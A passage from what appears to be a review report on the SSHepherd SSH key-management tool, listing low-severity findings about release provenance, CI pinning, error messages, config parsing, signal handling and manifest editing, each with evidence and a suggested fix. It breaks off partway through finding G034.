- **Status:** UNVERIFIED
- **Lens(es):** supply-chain (raw ids: L09-6)
- **Location:** .github/workflows/release.yml:391-396 (the only attest step, image subject) and :481-530 (release-binaries: permissions contents/id-token only, no attestations: write)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
grep -n -E 'attest|attestations:|sbom|id-token' release.yml -> 213/215 (BuildKit sbom for the image), 304 'attestations: write' and 392 attest-build-provenance in publish only (subject-name IMAGE_REPO); release-binaries has 'id-token: write' for sign-blob and nothing else. No cyclonedx/syft anywhere in .github, Makefile or scripts, while CLAUDE.md line 136 asks for 'SBOM per release: cyclonedx-gomod mod (or syft) — archive the artifact for provenance'.
~~~~

**Impact:** Users of the GitHub-release binaries (the darwin ones included) can check checksums and the signature but not where or from what they were built (gh attestation verify on a binary fails), and they get no dependency inventory.

**Fix direction:** Attest the binaries (attest-build-provenance with subject-path dist/sshepherd\_\*) in release-binaries, and attach a CycloneDX SBOM (cyclonedx-gomod or syft) covered by SHA256SUMS.

#### F039 [low] SHA pinning of actions is convention only: the repo allows any action and does not require full-SHA pins

- **Status:** UNVERIFIED
- **Lens(es):** supply-chain (raw ids: L09-7)
- **Location:** GitHub Actions settings (repos/javadh75/SSHepherd/actions/permissions); ci.yml:19-22 and release.yml:45-48 pinning comments
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: Enforce SHA pinning (and an allow-list of action owners) in the repo's Actions settings, or keep pinning as a reviewed convention?

**Evidence** (verbatim from the finding):

~~~~text
gh api repos/javadh75/SSHepherd/actions/permissions -> {"enabled":true,"allowed_actions":"all","sha_pinning_required":false}. Every current uses: line is SHA-pinned (13 distinct actions), but no gate checks it: actionlint v1.7.12 (-shellcheck="") passes the workflows and does not check pinning.
~~~~

**Impact:** A future workflow edit with a tag ref (uses: x/y@v1), from the owner or a PR the owner merges, passes every gate. That job could hold packages:write or id-token:write in release.yml.

**Fix direction:** Turn on the repository's 'require actions pinned to a full-length commit SHA' setting, and optionally limit allowed\_actions to the owners in use (actions, docker, sigstore, hadolint).

#### F040 [low] No gate proves the published GHCR image can be pulled anonymously; every release/CI step logs in, and a new GHCR package starts private

- **Status:** UNVERIFIED
- **Lens(es):** container (raw ids: L10-3)
- **Location:** .github/workflows/release.yml:162-228 (image), 293-411 (publish), .github/workflows/ci.yml published-image-scan
- **Finder's confidence:** PLAUSIBLE (not verified in this review)
- **Owner decision:** yes: make ghcr.io/javadh75/sshepherd public before the first tag, and add an anonymous-pull check to publish (yes/no)?

**Evidence** (verbatim from the finding):

~~~~text
Every registry step authenticates: release.yml image/gate/publish use docker/login-action and TRIVY_USERNAME/TRIVY_PASSWORD; publish's `cosign verify` ("the way users do") also runs after login; ci.yml published-image-scan logs in too. The dry run 42860941435 job "Build once, push by digest" succeeded, so ghcr.io/javadh75/sshepherd already exists as a package. GitHub's documented default for a newly published user-scoped package is private. `gh api /users/javadh75/packages/container/sshepherd` -> HTTP 403 (token lacks read:packages), so visibility could not be read. No README/docs mention setting the package visibility.
~~~~

**Impact:** If the package is private, the first release passes every gate and is signed, yet README's `docker pull`/`cosign verify` instructions and the Kubernetes recipe fail for every user with unauthorized, and nothing in CI notices.

**Fix direction:** Confirm the package visibility now; consider an unauthenticated imagetools inspect (or cosign verify) step in publish after tagging so a private package fails the release.

#### F041 [low] Audit and plan keep about 11x the bytes read in live heap (each key copied into several retained structures)

- **Status:** UNVERIFIED
- **Lens(es):** performance (raw ids: L11-2)
- **Location:** internal/audit/audit.go:183-187 (ParseFile, Diff, duplicatesOf, LinesByFingerprint kept in ServerResult); internal/authkeys/authkeys.go:195-219 (Diff copies Key by value into Actual map and OK/Missing/Unauthorized); internal/authkeys/policy.go:43 (LinesByFingerprint)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe test TestProbeLiveHeap (runtime.GC + MemStats around audit.Run + apply.BuildWith, zero-latency in-memory reader returning each server's rendered file): `S=1000/U=200: files 20.7 MiB total (21.2 KiB avg), live heap growth after audit+plan 235.2 MiB, total alloc 1329.2 MiB`; `S=2000/U=400: files 83.5 MiB total (42.8 KiB avg), live heap growth after audit+plan 894.2 MiB, total alloc 5248.7 MiB`. Heap profile (inuse_space) at 2000 servers: authkeys.Diff 326.27MB, authkeys.LinesByFingerprint 160.33MB, apply.planOne 130.16MB flat, authkeys.ParseFile 83.38MB, ssh.FingerprintSHA256 52.50MB. About 1.2 KB retained per ~110-byte key line. BenchmarkProbeAuditRun 2000x400 allocates 2.29 GB per run.
~~~~

**Impact:** Every server's parsed keys stay resident for the whole run (results, plans and reports are all built in memory), so a large fleet with long authorized\_keys files needs close to 1 GB on an operator laptop or a memory-limited CI runner/container; the 1 MiB per-file read cap bounds a single hostile server to roughly 11 MiB, not the fleet total.

**Fix direction:** Keep one parsed \[]Key per server and index it (positions or pointers) instead of copying Key values into Actual, OK/Missing/Unauthorized and Lines; build per-fingerprint line lists only for servers that need them; consider dropping derived maps once the report/plan for a server is built.

#### F042 [low] Fleet preflight errors give no remedy: a missing known\_hosts prints a raw, path-doubled error, and the no-agent error never mentions --identity

- **Status:** UNVERIFIED
- **Lens(es):** product (raw ids: L12-4)
- **Location:** cmd/sshepherd/fleet.go:168-171; internal/sshconn/knownhosts.go:35-42; cmd/sshepherd/identity.go:100 / apply.go:419
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Fresh HOME with a manifest but no ~/.ssh/known_hosts: `sshepherd audit` (also adopt, apply --dry-run) -> `error: known_hosts preflight: load known_hosts /…/home/.ssh/known_hosts: open /…/home/.ssh/known_hosts: no such file or directory` [exit 3] — no hint, path twice. `validate` on the same setup gives a friendly `warn: no known_hosts at ~/.ssh/known_hosts; host keys were not checked`. With known_hosts present and no agent: `error: agent preflight: no SSH agent: SSH_AUTH_SOCK is not set (start ssh-agent and ssh-add a key)` — no mention of `--identity PATH`, which README Requirements (README.md:154-157) gives as the headless alternative.
~~~~

**Impact:** A first audit in a fresh container/CI runner (the headless use the README advertises) stops at an error that names neither the --known-hosts flag nor how to record a host key out of band, nor the --identity alternative to an agent.

**Fix direction:** Attach hints like the dial errors already carry: for a missing known\_hosts name --known-hosts and the verify-then-record procedure from Requirements; for no agent mention --identity; drop the duplicated path.

#### F043 [low] The no-manifest hint dead-ends on a machine without ~/.ssh/config

- **Status:** UNVERIFIED
- **Lens(es):** product (raw ids: L12-5)
- **Location:** cmd/sshepherd/fleet.go:128-130; cmd/sshepherd/import.go:440; internal/sshcfg/sshcfg.go:114
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Fresh HOME: `sshepherd audit` -> `error: no manifest at sshepherd.yaml — create one with 'sshepherd import --servers-only -o sshepherd.yaml', or pass --config PATH`; running that exact command -> `error: load ssh config: read ssh config: open /…/home/.ssh/config: no such file or directory` [exit 3], with no hint (no `import PATH` form, no pointer to a hand-written manifest or the README example).
~~~~

**Impact:** The tool's own onboarding path fails for users without an OpenSSH client config (CI runners, containers, users of other SSH clients), and the second error is a stuttered Go error chain.

**Fix direction:** When the default ssh config is missing, say so plainly and point to `import PATH` or the README's minimal manifest; consider pointing the no-manifest hint at both routes.

#### F044 [low] README Status and Install read as an internal changelog for an unreleased product and advertise artifacts that do not exist yet

- **Status:** UNVERIFIED
- **Lens(es):** product (raw ids: L12-6)
- **Location:** README.md:55-92 (Status), README.md:108-121 (Release binaries), README.md:157, 3406; docs/release-notes/next.md
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: should the first release's notes be framed as an initial release (no upgrade notes) or as upgrade notes for master users, and should per-slice history move to a CHANGELOG?

**Evidence** (verbatim from the finding):

~~~~text
README.md:78 `(--offer-all-keys restores the old offer)`; README.md:92 `Owner follow-ups: a fresh import -o FILE --force warns … kind manifest_settings_dropped … instead of hanging the run`; README.md:157 `the agent is required, exactly as before`; README.md:3406 `it no longer prefers --identity key files over agent keys`. README.md:108 `Release binaries — each release attaches static binaries…` while `gh release list` -> `[]` and `gh api repos/javadh75/SSHepherd/tags` -> `[]`. docs/release-notes/next.md tells upgraders `a scheduled audit that passed before now exits 2` although no release exists, while P10 S2 renamed flags without aliases on the grounds that 'no release has shipped'. README is 3633 lines / 30253 words; Status is ten dense paragraphs of internal kinds rather than what works and what does not.
~~~~

**Impact:** A new user cannot tell current behaviour from history, and the first two install routes in the Install section are not available; the first release's upgrade notes will describe a change relative to a version nobody could install.

**Fix direction:** Turn Status into a short what-works / known-limits list (move the per-slice history to a CHANGELOG or release notes), mark release binaries and the ghcr image as 'from the first release', and decide whether next.md's upgrade framing fits a first release.

#### F045 [low] No contributor or versioning scaffolding: CONTRIBUTING, CODE\_OF\_CONDUCT, issue/PR templates, CHANGELOG and a pre-1.0 compatibility policy are all absent

- **Status:** UNVERIFIED
- **Lens(es):** product (raw ids: L12-7)
- **Location:** repo root and .github/
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: does the project accept outside contributions now (and under DCO, CLA or neither), or should CONTRIBUTING say contributions are not yet accepted?

**Evidence** (verbatim from the finding):

~~~~text
`gh api repos/javadh75/SSHepherd/community/profile` -> health_percentage 42; code_of_conduct, contributing, issue_template, pull_request_template all null; issues are enabled (`has_issues: true`). The only compatibility statement is the JSON schema rule (README.md:1232); nothing states how CLI flags, exit codes or the manifest schema may change before 1.0, although flags were renamed without aliases (P10 S2).
~~~~

**Impact:** External contributors get no build/test/commit rules (the strict ci-ok and linear-history rules live only in CLAUDE.md), bug reports arrive without version/manifest/redacted-output structure, and users cannot predict what a minor release may break.

**Fix direction:** Add CONTRIBUTING (make check, make integration, preflight branch flow, DCO/CLA choice), a bug template asking for --version and redacted --json output, a CHANGELOG or a pointer to release notes, and a short versioning policy for CLI, exit codes and manifest schema.

#### F046 [low] A manifest typo error leaks the Go type name and omits which file failed

- **Status:** UNVERIFIED
- **Lens(es):** product (raw ids: L12-8)
- **Location:** internal/config/config.go:159-169; cmd/sshepherd/fleet.go:111-113
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Manifest `users:\n  - nam: alice` -> `sshepherd validate --config bad2.yaml` -> `error: parse manifest: yaml: unmarshal errors:   line 2: field nam not found in type config.User` [exit 3]. A validation error on the same file names it (`error: invalid manifest bad.yaml: user "alice" …`); manifestError deliberately passes `parse manifest:` errors through without the path.
~~~~

**Impact:** The README promises a typo 'fails loudly'; it does, but in Go-internal terms (`config.User`) with no file name, which is unclear when a CI job or --merge run touches more than one YAML file.

**Fix direction:** Name the file for parse errors too and map yaml.v3's type names to manifest section words (users/servers/access entry).

#### G021 [low] sshcfg's tokenizer is not OpenSSH's argv\_split: single quotes are kept, backslash escapes ignored and Unicode spaces split arguments, so import writes hosts and users ssh never uses

- **Status:** UNVERIFIED
- **Lens(es):** gap-import-pipeline-sshcfg-reconcile-f1 (raw ids: K7-6)
- **Location:** internal/sshcfg/line.go:39-63 (splitArgs: only '"' quoting, unicode.IsSpace), :24 (keyword split on unicode.IsSpace)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe c2 + `sshepherd import --servers-only` (exit 0, no warning): `HostName 'q1.example.com'` / `User 'deploy'` -> manifest `host: '''q1.example.com'''`, `user: '''deploy'''` (ssh -G: hostname q1.example.com, user deploy). `IdentityFile ~/.ssh/my\ key` and `IdentityFile '~/.ssh/other key'` -> sshcfg Identities ["~/.ssh/my\\" "'~/.ssh/other"] (ssh -G: '~/.ssh/my key', '~/.ssh/other key'). `Host n1<U+00A0>n2` -> sshcfg aliases n1 and n2 at 10.2.2.2 user nb; ssh -G n1 -> hostname n1, user javad (one pattern for ssh). Also `Include ${VAR}/x` or `Include %d/...` (tokens and env vars Include accepts per ssh_config(5)) only warn 'matched no files'.
~~~~

**Impact:** Manifest entries with literal quote characters in host/user (unreachable, exit 1 at audit/apply), identity files that cannot be found (users and grants missing), and phantom hosts from NBSP-split patterns. Package doc says arguments 'may be double-quoted' only.

**Fix direction:** Port argv\_split: ' and " quoting, backslash escapes for quote/backslash/space, split only on space and tab, an unterminated quote is an error (warn and skip the line). Add these lines to loadResolutionCases so the ssh -G differential pins them.

#### G022 [low] import --merge calls a same-name host whose ProxyJump route differs from the manifest's 'identical, skipped' and warns nothing, though OP7 treats a different route as possibly another machine

- **Status:** UNVERIFIED
- **Lens(es):** gap-import-pipeline-sshcfg-reconcile-f1 (raw ids: K7-7)
- **Location:** internal/reconcile/reconcile.go:198-205 (identical test compares host/user/port only); internal/reconcile/routes.go:107 (fixed hosts never resolved, so no proxy\_not\_mapped either)
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: on a same-name host whose route differs, should merge only warn (manifest kept, grants still extended) or treat it like OP7's other-route case (warn and not extend grants)?

**Evidence** (verbatim from the finding):

~~~~text
Probe m: manifest bastion (192.0.2.1 jump) and web (10.0.0.5 deploy, no via); ssh config has the same two plus `ProxyJump bastion` on web. `import --servers-only --merge man.yaml` -> notes 'server "web" already in the manifest — identical, skipped', warnings [] (JSON), exit 0. For a differently named host at the same target, newServer warns otherRoute and does not move grants.
~~~~

**Impact:** The operator is told the entries are identical while ssh reaches the host through a bastion and the manifest dials it directly (unreachable later), and the identity grants derived from that host are still extended onto it. The spec says the manifest wins; it does not say to call them identical.

**Fix direction:** Include the route (MapRoutes key vs cfg.Chain) in the identical test; on a difference, keep the manifest entry but emit a merge\_conflict/proxy\_not\_mapped warning naming both routes.

#### G023 [low] SIGQUIT (Ctrl-\\) is not handled: every command exits 2 (D28's security-alarm code) with a goroutine dump, and at the passphrase prompt a bash terminal is left with echo off

- **Status:** UNVERIFIED
- **Lens(es):** gap-keyfile-private-key-handling (raw ids: K2-3, K2-2)
- **Location:** \[K2-3] cmd/sshepherd/run.go:126-128 (signal.Notify(sigs, os.Interrupt, syscall.SIGTERM) only) || \[K2-2] cmd/sshepherd/run.go:127 (SIGQUIT and SIGHUP not handled); internal/keyfile/tty\_unix.go:70-100 (restore runs only on read completion or ctx.Done)
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: should SIGQUIT keep Go's goroutine dump with exit 2 (colliding with D28's security-alarm code) or be handled like SIGTERM (first cancels with exit 3, a second exits 131)?

**Evidence** (verbatim from the finding):

~~~~text
[K2-3] The K2-2 probe's `; echo EXIT=$?` printed `EXIT=2` after a register dump (`pc 0x19736750c ... fault 0x19736750c`) on bash 5, /bin/bash and zsh. Go's runtime exits 2 on an unhandled SIGQUIT. D28 reserves 2 for security alarms (critical drift, changed host key, revoked key still installed); 3 is the interrupted/tool-error code and watchSignals uses 128+signo for a forced exit. || [K2-2] ISIG is kept, so Ctrl-\ at the prompt delivers SIGQUIT; Go's default handler dumps goroutines and exits without the deferred restore. PTY probe (same harness as K2-1), send \x1c at the prompt, then run `stty -a | tr ' ' '\n' | grep -E '^-?echo$'` and `cat` with a typed line: bash 5 (Homebrew) and /bin/bash 3.2 both print `-echo`, the typed command lines are invisible (`PROMPT> -echo`, `PROMPT> VISIBLE_AFTER`), probe verdict `VISIBLE_AFTER count (2 = echo on, 1 = echo off): 1`. zsh restores its own mode (count 2). Control: Ctrl-C (`int` scenario) restores echo on all three shells (count 2).
~~~~

**Impact:** \[K2-3] A supervisor or user sending SIGQUIT (e.g. `timeout -s QUIT`, Ctrl-\\) gets an exit code that monitoring maps to a security incident, plus a goroutine dump on stderr instead of the interrupted message. || \[K2-2] Ctrl-\\ is what users reach for when Ctrl-C seems not to work (see K2-4); the shell is left without echo, contrary to the spec's 'never leaves the shell without echo' (identity-keyfile-auth-design.md:239, tty\_unix.go:61-62). No secret leaks.

**Fix direction:** \[K2-3] Add syscall.SIGQUIT (and SIGHUP) to run()'s signal.Notify so the first cancels (exit 3) and a second exits 128+signo; or document that SIGQUIT is a debugging dump outside the D28 table. || \[K2-2] Treat SIGQUIT and SIGHUP like SIGINT/SIGTERM while the prompt is up (restore the termios before exiting), or register them in run() so the first one cancels ctx; together with K2-1's handler this is the readpassphrase(3) signal set (ALRM, HUP, INT, PIPE, QUIT, TERM, TSTP, TTIN, TTOU).

#### G024 [low] Ctrl-C during key loading is ignored until every bcrypt KDF finishes (37 s for three 2048-round keys)

- **Status:** UNVERIFIED
- **Lens(es):** gap-keyfile-private-key-handling (raw ids: K2-4)
- **Location:** internal/keyfile/keyfile.go:84-110 (prepareAll never checks ctx), :152-185 (unlockFromFiles runs the KDF for the default file on every encrypted key)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe: three ed25519 keys made with `ssh-keygen -a 2048`, a wrong default `--identity-passphrase-file`, stdin /dev/null; one decryption alone took `12.432 total`. `kill -INT` 1 s after start: `exit=3 seconds_after_SIGINT=37`, then `error: interrupted: context canceled`. Load takes ctx but only the prompt observes it; classify accepts up to maxBcryptRounds = 2048 (classify.go:22,149).
~~~~

**Impact:** The first Ctrl-C appears to do nothing for tens of seconds; users press it again (exit 130) or Ctrl-\\ (K2-2/K2-3). Not a security issue.

**Fix direction:** Check ctx.Err() before each key's read and before each KDF attempt in prepareAll/unlockFromFiles; optionally run the KDF in a goroutine and abandon it on ctx.Done.

#### G025 [low] An OpenSSH key block carrying a PEM Proc-Type: ENCRYPTED header passes classify as unencrypted, then is treated as encrypted and prompted for, but can never be unlocked

- **Status:** UNVERIFIED
- **Lens(es):** gap-keyfile-private-key-handling (raw ids: K2-5)
- **Location:** internal/keyfile/classify.go:68-69 (OPENSSH block headers ignored); internal/keyfile/keyfile.go:132-137 (PassphraseMissingError flips cls.encrypted)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
x/crypto v0.58.0 ParseRawPrivateKey returns PassphraseMissingError for any block whose Proc-Type contains ENCRYPTED, before looking at the type (keys.go:1395-1397), while ParseRawPrivateKeyWithPassphrase sends an OPENSSH block to the openssh-key-v1 path, which refuses cipher none. Probe: an unencrypted ed25519 OpenSSH key with `Proc-Type: 4,ENCRYPTED` inserted after the BEGIN line. Headless: `error: identity: .../hdr_key is encrypted and no passphrase source is available (use --identity-passphrase-file ...)`. With a passphrase file: `error: identity: .../hdr_key: cannot decrypt the private key: ssh: key is not password protected`. `ssh-keygen -y -f hdr_key`: `Load key "hdr_key": invalid format`.
~~~~

**Impact:** Breaks the 'classify before any prompt, never type a passphrase for a key that was never going to work' contract for a malformed file (the operator types a real passphrase, and the headless error points at passphrase flags instead of the file). It needs a hand-damaged file; no secret leaks.

**Fix direction:** In classify, refuse an OPENSSH PRIVATE KEY block that has any PEM headers (`len(block.Headers) > 0` -> refuse(path, "malformed OpenSSH private key (PEM headers)")); add a classify table row.

#### G026 [low] Save on a hard-linked --config silently splits the link: the other name keeps the pre-revoke manifest, although SameAs refuses a hard-linked -o for exactly this reason

- **Status:** UNVERIFIED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-6)
- **Location:** internal/manifest/store.go:143-180 (Save renames over Resolved, no link-count check) vs store.go:75-77,104-110 (SameAs: `Save renames over the read path only, so the other name would keep the old bytes` -> refusal)
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe: m.yaml (0640) hard-linked as deploy.yaml; Read(m.yaml).Save(edited) -> `save ok; saved-name edited=true, hard-link-name edited=false, mode=-rw-r-----`. No warning or refusal.
~~~~

**Impact:** A deploy/cron copy kept as a hard link keeps applying the pre-revoke manifest; with --no-apply (or on servers the revoke did not write) its apply and audit show bob as compliant, so the revocation silently never takes effect there. Servers the revoke wrote are protected by the serial.

**Fix direction:** In Save (or Read), refuse or warn when the resolved file's link count is > 1, with the same wording SameAs uses.

#### G027 [low] On a CRLF manifest every edit drops or moves comments (yaml.v3 attaches them to the wrong nodes), breaking the documented fidelity contract

- **Status:** UNVERIFIED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-7)
- **Location:** internal/manifest/manifest.go:71-73 (yaml node decode of the raw bytes, no line-ending normalization); edit.go:162-188 (removeItems rescues only HeadComment); README.md:2747-2749
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe, same manifest LF vs CRLF, RemoveKey(laptop)+RemoveUser(carol). LF: `# alice desktop` stays above the surviving key and carol's comment is rescued. CRLF: `# alice desktop` and `# carol: contractor, leaves 2026-12` are gone, and `# bob: staff` is emitted inside bob's mapping (`- name: bob\n    # bob: staff\n\n    keys: [...]`). Even a no-op Encode of a CRLF file moves the item head comment `# bob is staff` below `- name: bob` (LF: bob item HeadComment="# bob is staff"; CRLF: "").
~~~~

**Impact:** Annotations in the security record (who a key belongs to, why a grant exists) are lost or reattached to another entry; the output is also rewritten to LF. Cosmetic for access, but the README promises comments are preserved.

**Fix direction:** Normalize CRLF to LF before the node decode (and say so), or refuse a CRLF manifest for edits with an UnsupportedError like anchors.

#### G028 [low] A removed users:/access: entry's own head comment is moved onto the next entry, re-labelling a survivor (the same reason the editor gives for not moving a key's comment)

- **Status:** UNVERIFIED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-8)
- **Location:** internal/manifest/edit.go:21-27 and 162-188 (rescue for users:/access:), edit.go:72-75 (keys: `moving it would re-label a survivor`)
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: should a removed entry's directly attached head comment move to the next entry (today: keeps section headings, re-labels survivors) or be dropped with the entry the way key comments are (or only blank-line-separated headings kept)?

**Evidence** (verbatim from the finding):

~~~~text
Probe (LF): users `# carol: contractor, leaves 2026-12` / carol, `# bob: staff` / bob; RemoveUser(carol) output: `  # carol: contractor, leaves 2026-12\n  # bob: staff\n  - name: bob`.
~~~~

**Impact:** After an offboarding, the next user (or grant) carries the removed one's description, such as an expiry or 'contractor', in the manifest that reviewers read as the access record. Documented behavior, chosen to keep section headings.

**Fix direction:** Rescue only comment blocks separated from the entry by a blank line (section headings), or keep the rescued text but prefix it (e.g. `# (from removed carol)`).

#### G029 [low] The schema round-trip guard covers entry fields only; nothing ties config.Config's top-level sections to manifest.Draft/topLevelKeys, so a new section would be silently dropped by adopt's regenerate

- **Status:** UNVERIFIED
- **Lens(es):** gap-manifest-store-and-editor (raw ids: K1-9)
- **Location:** internal/manifest/manifest.go:115 (topLevelKeys), 370-377 (Draft), 390-415 (GenerateWith); cmd/sshepherd/adopt.go:67-69 (Draft built field by field); cmd/sshepherd/schema\_roundtrip\_test.go:14-17 (samples cover User/Server/Access/Group/Tombstone only); internal/config/config.go:110-117 (Config sections)
- **Finder's confidence:** PLAUSIBLE (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
grep for a reflection over config.Config fields in tests finds only fill() over entry types (schema_roundtrip_test.go:49). manifest.go:312-315 claims `A new config field is therefore emitted by adopt, import and Append with no change here`; that holds for entry fields, while groups: and revoked: were each added to Draft by hand and are pinned by per-section tests (TestAdoptRegenerateKeepsGroups, TestAdoptRegenerateKeepsRevokedAndSerial).
~~~~

**Impact:** Latent: the next top-level section (several were added slice by slice) can be erased by an in-place adopt with no failing test, the same class as the PRD-1 revocation-memory erase the per-section tests were written for.

**Fix direction:** Add a reflection test asserting every yaml-tagged field of config.Config is a key of topLevelKeys and a field of Draft, and that GenerateWith(Draft-from-cfg) parses back DeepEqual for each section.

#### G030 [low] The OpenSSH under test is neither pinned nor recorded: the digest-pinned base images install whatever openssh the repo serves at build time, and integration logs never print the sshd version

- **Status:** UNVERIFIED
- **Lens(es):** gap-real-sshd-integration-and-scripts (raw ids: K3-2)
- **Location:** ci/images/sshd-alpine.Dockerfile:5 (`RUN apk add --no-cache openssh`), ci/images/sshd-debian.Dockerfile:4 (`apt-get install -y --no-install-recommends openssh-server`), ci/images/sshd-rocky.Dockerfile:6 (`dnf -y install openssh-server shadow-utils`); scripts/integration.sh:45 (`docker build -q -t "$IMAGE" -f "$DOCKERFILE" ci/images >/dev/null`)
- **Finder's confidence:** CONFIRMED (not verified in this review)
- **Owner decision:** yes: should the sshd package version be pinned (reproducible, needs manual bumps), or only logged (always latest within the pinned distro)?

**Evidence** (verbatim from the finding):

~~~~text
Full `make integration` logs for alpine, debian and rocky (all rc=0, 118 PASS each) contain 0 lines mentioning OpenSSH. The script's only output is 'building sshepherd-it-sshd:<distro> ...' and 'waiting for <distro> sshd on ...'. The versions had to be read out of band: alpine `OpenSSH_10.3p1`, debian `openssh-server 1:10.0p1-7+deb13u4`, rocky `openssh-server-9.9p1-29.el10_2.rocky.0.1`. Locally `docker build` reused cached layers 40 h and 2 days old (`sshepherd-it-sshd:alpine ... 40 hours ago`), so a local run and a fresh CI build of the same commit can test different sshd builds. CLAUDE.md presents the matrix as pinned ('every container image is pinned by digest ... alpine 3.24.3, debian 13.6-slim, rocky 10.2').
~~~~

**Impact:** A real-sshd regression or a grammar change (the F002/F003/F025 class depends on the exact sshd) cannot be tied to the sshd that CI ran. A green run last week and a red run today on the same commit look like a code regression. Local runs can test an sshd older than CI's for as long as the build cache lives.

**Fix direction:** Print `sshd -V` (or the package version) for each container in integration.sh, for example after the readiness wait. Optionally pin the package version (apk add openssh=&lt;ver>, apt-get install openssh-server=&lt;ver>, dnf install openssh-server-&lt;ver>) and let Dependabot or a manual bump move it, or build with --pull/--no-cache in CI.

#### G031 [low] integration.sh claims parallel runs from several worktrees never collide, but the sshd image tag is shared and resolved by name after the build

- **Status:** UNVERIFIED
- **Lens(es):** gap-real-sshd-integration-and-scripts (raw ids: K3-3)
- **Location:** scripts/integration.sh:11-13 ('Every run gets unique container names ... so parallel runs from several worktrees never collide') vs :27 (`IMAGE="sshepherd-it-sshd:$DISTRO"`), :45 (`docker build -q -t "$IMAGE"`), :221-237 (`docker run ... "$IMAGE"`)
- **Finder's confidence:** PLAUSIBLE (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Container and network names are unique per run (RUN_ID=sshepherd-it-$$), but the image tag is not. Each run builds and then starts containers by the shared tag, so two concurrent runs on commits whose ci/images/sshd-<distro>.Dockerfile differ can each start the other's image if the second `docker build -t` lands between the first run's build and its `docker run` (the gap holds five ssh-keygen calls). Each `make integration` re-tags the shared name: during this review the :alpine tag's image ID changed (99b81f395ce0 -> 2d22cfff7114, same creation time) after a rebuild, so the tag is mutable state that every run shares. Not reproduced as a wrong-image run.
~~~~

**Impact:** Rare, but in the workflow CLAUDE.md prescribes (parallel agents in worktrees) a run can silently test the wrong sshd image. A Dockerfile change could then pass or fail for the other branch's reasons.

**Fix direction:** Run the image by the ID `docker build -q` prints (`IMAGE_ID=$(docker build -q ...)`), or tag it with RUN\_ID, and drop the 'never collide' claim if not.

#### G032 [low] The paste-ready lock-removal command runs its POSIX script in the account's login shell, so it fails for csh/tcsh/fish accounts that every sshepherd command supports

- **Status:** UNVERIFIED
- **Lens(es):** gap-remote-posture-lock-probe-header (raw ids: K4-2)
- **Location:** internal/sshwrite/lock.go:121 (`ssh -p %d %s %s` with sshconn.ShQuote(lockRemovalScript(path)) only); compare internal/sshconn/connect.go:621-645 (remoteCommand wraps every script in `exec /bin/sh -c '...'` precisely because sshd runs "$SHELL -c" and fish/csh/tcsh misparse ${HOME:?})
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Ran the generated removal script the way sshd runs a command ("$SHELL -c <cmd>") against a planted lock: /bin/sh, dash, zsh: rc=0, lock removed. /bin/csh and /bin/tcsh: `Bad : modifier in $ '?'.` rc=1, lock left. fish (alpine container): `p="${HOME:?}"/'.ssh/authorized_keys'; ...` error, rc=127, lock left.
~~~~

**Impact:** The documented recovery step fails on accounts sshepherd otherwise manages; the user must translate it by hand.

**Fix direction:** Export sshconn's remoteCommand (or an equivalent) and print `ssh ... <ShQuote(remoteCommand(lockRemovalScript(path)))>`; add csh/fish rows to the lock tests or the shell matrix.

#### G033 [low] An absurd header serial above 2^53-1 (up to 16 digits) is read as 'not managed', so audit reports the server compliant (exit 0) where serial M+1001 is a critical forged header (exit 2)

- **Status:** UNVERIFIED
- **Lens(es):** gap-remote-posture-lock-probe-header (raw ids: K4-4)
- **Location:** internal/authkeys/header.go:49-52 (v > MaxHeaderSerial returns (0, false)); internal/audit/report.go:617-618 (forged needs HeaderManaged); spec docs/superpowers/specs/2026-11-08-revocation-memory-design.md:139 (D4: 'absurd serials count as forged')
- **Finder's confidence:** CONFIRMED (not verified in this review)

**Evidence** (verbatim from the finding):

~~~~text
Probe test in internal/audit (memoryConfig manifest serial 7, key-compliant files): header serial 1008 -> status=critical exit=2; 9007199254740991 -> critical exit=2; 9007199254740992 -> status=compliant exit=0; 9999999999999999 -> status=compliant exit=0.
~~~~

**Impact:** The forged-header alarm (D4/D28 exit 2) misses the most absurd serials; audit (compliant) and apply (plans a header rewrite) disagree about the same file. No write is blocked either way.

**Fix direction:** Have ParseHeader distinguish 'managed shape, serial out of range' (e.g. return managed with a sentinel above MaxHeaderSerial, or a third result) so audit grades it forged and apply rewrites it under row 1; add the boundary rows to TestForgedSerialIsCritical.

#### G034 [low] A busy lock whose owner record is a FIFO (or a link to /dev/zero) hangs the write for the whole 2-minute session budget, ignoring Ctrl-C, then reports 'unknown state' with error\_kind agent instead of a lock refusal

- **Status:** UNVERIFIED
- **Lens(es):** gap-remote-posture-lock-probe-header (raw ids: K4-5)
- **Location:** internal/sshwrite/sshwrite.go:89 (lockBusy: `head -n 1 "$l/owner" 2>/dev/null | cut -c1-200` on whatever $l/owner is); session.go:88-94 and 273-301 (a timed-out stage 1 goes through recheckAfterDrop -> reconnectFailed -> unknownStateError)
- **Finder's confidence:** CONFIRMED (not verified in this review)

